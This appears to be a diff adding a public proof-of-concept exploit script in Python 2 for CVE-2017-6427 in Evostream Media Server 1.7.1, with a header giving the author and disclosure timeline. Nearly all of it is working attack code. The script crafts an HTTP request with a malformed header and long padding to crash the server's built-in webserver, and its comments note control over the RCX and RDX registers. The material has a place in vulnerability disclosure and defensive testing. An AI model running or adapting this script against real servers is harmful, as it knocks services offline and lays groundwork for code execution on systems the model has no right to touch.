@@ -1,0 +1,42 @@
+# Exploit Title: Evostream Media Server 1.7.1 – Built-in Webserver DoS
+# Date: 2017-03-07
+# Exploit Author: Peter Baris
+# Vendor Homepage: http://www.saptech-erp.com.au
+# Software Link: https://evostream.com/software-downloads/
+# Version: 1.7.1
+# Tested on: Windows Server 2008 R2 Standard x64
+# CVE : CVE-2017-6427
+
+# 2017-03-02: Vulnerability reported
+# 2017-03-03: Software vendor answered, vulnerability details shared
+# 2017-03-07: No answer, publishing
+
+import socket
+import sys
+
+try:
+    host = sys.argv[1]
+    port = 8080
+except IndexError:
+    print "[+] Usage %s <host>  " % sys.argv[0]
+    sys.exit()
+
+
+
+buffer = "GET /index.html HTTP/1.1\r\n"
+buffer+= "Host: "+host+":"+str(port)+"\r\n"
+buffer+= "User-Agent: Mozilla/5.0 (X11; Linux i686; rv:44.0) Gecko/20100101 Firefox/44.0 Iceweasel/44.0.2\r\n"
+buffer+="Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\
+r\n"
+buffer+="Accept-Language: en-US,en;q=0.5\r\n"
+buffer+="Accept-Encoding: gzip, deflate\r\n"
+buffer+="Referer: http://192.168.198.129/login"
+buffer+="Connection: keep-alive\r\n"
+buffer+="Cont"+"\x41"*8+":\r\napplication/x-www-form-urlencoded\r\n"   # RCX Control
+#buffer+="\xff\xad\xde"+"\x41"*8+":\r\napplication/x-www-form-urlencoded\r\n" # Remove hash to control RDX and CX(it will have the value 0x000000000000dead)
+buffer+="Content-Length: 5900\r\n\r\n"
+buffer+="B"*4096 # This is just to prove that the stack will also contain any buffer delivered with the malicios HTTP header
+s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+connect=s.connect((host,port))
+s.send(buffer)
+s.close()
